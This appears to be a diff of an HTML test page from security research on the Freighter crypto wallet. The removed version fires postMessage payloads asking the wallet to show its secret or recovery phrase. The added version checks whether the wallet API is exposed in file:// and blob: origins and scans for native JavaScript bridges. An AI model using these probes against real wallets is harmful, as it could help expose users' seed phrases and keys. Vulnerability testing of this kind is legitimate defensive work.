@@ -1,19 +1,57 @@
-<button id="trigger">TRIGGER SHOW_SECRET</button>
-<script>
-const payloads = [
-  {"type":"SHOW_SECRET","origin":"freighter"},
-  {"type":"SHOW_SECRET"},
-  {"request":{"type":"SHOW_MNEMONIC"}},
-  {"type":"SHOW_RECOVERY_PHRASE"}
-];
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WebView Tests - file:// blob: bridge</title>
+</head>
+<body style="background:#0a0a0b;color:#0f0;font-family:monospace;padding:16px">
+<h3>TEST 1: file:// & TEST 2: blob: & TEST 3: bridge</h3>
+<button onclick="testCurrent()" style="width:100%;height:44px">TEST CURRENT ORIGIN</button>
+<button onclick="testBlob()" style="width:100%;height:44px;margin-top:8px">CREATE BLOB URL & TEST</button>
+<button onclick="testBridge()" style="width:100%;height:44px;margin-top:8px">SCAN JS BRIDGES</button>
+<pre id="log" style="background:#111;border:1px dashed #333;padding:10px;min-height:150px;white-space:pre-wrap;margin-top:12px">[Ready] href = </pre>
 
-document.getElementById('trigger').onclick = () => {
-  payloads.forEach((p,i)=>{
-    setTimeout(()=>{
-      window.postMessage(p, "*");
-    }, i*300);
-  });
-};
-// Kalau Freighter kebuka screen "Show Recovery Phrase" 
-// kayak screenshot 12.20 kamu = VULN Medium
+<script>
+const logEl = document.getElementById('log');
+logEl.textContent += location.href + "\norigin: " + location.origin;
+function log(m){ logEl.textContent += "\n" + m; }
+
+function testCurrent(){
+  log("--- CURRENT ---");
+  log("protocol: " + location.protocol);
+  log("origin: " + location.origin);
+  log("freighterApi? " +!!window.freighterApi);
+  if(window.freighterApi){
+    log(">>> VULN: injected in " + location.protocol);
+    window.freighterApi.getPublicKey().then(k=>log("Got pubkey: "+k.slice(0,20)+" = HIGH")).catch(e=>log("Blocked: "+e.message+" = SECURE"));
+  } else log("SECURE: not injected");
+}
+
+function testBlob(){
+  const html = `<html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
+  <div id="l"></div><script>
+  const l=document.getElementById('l');
+  l.innerHTML += "href: "+location.href+"<br>origin: "+location.origin+"<br>";
+  l.innerHTML += "freighterApi? "+!!window.freighterApi+"<br>";
+  if(window.freighterApi){l.innerHTML += "<b>BUG HIGH: provider in blob:null!</b>";}else{l.innerHTML+="SECURE no provider";}
+  <\/script></body></html>`;
+  const blob = new Blob([html], {type:'text/html'});
+  const url = URL.createObjectURL(blob);
+  window.open(url,'_blank');
+}
+
+function testBridge(){
+  log("--- BRIDGE SCAN ---");
+  for(let k in window){
+    let low=k.toLowerCase();
+    if(low.includes('android')||low.includes('bridge')||low.includes('freighter')){
+      log("Found window."+k);
+    }
+  }
+  if(window.Android) log("FOUND window.Android = RISK");
+}
+testCurrent();
 </script>
+</body>
+</html>
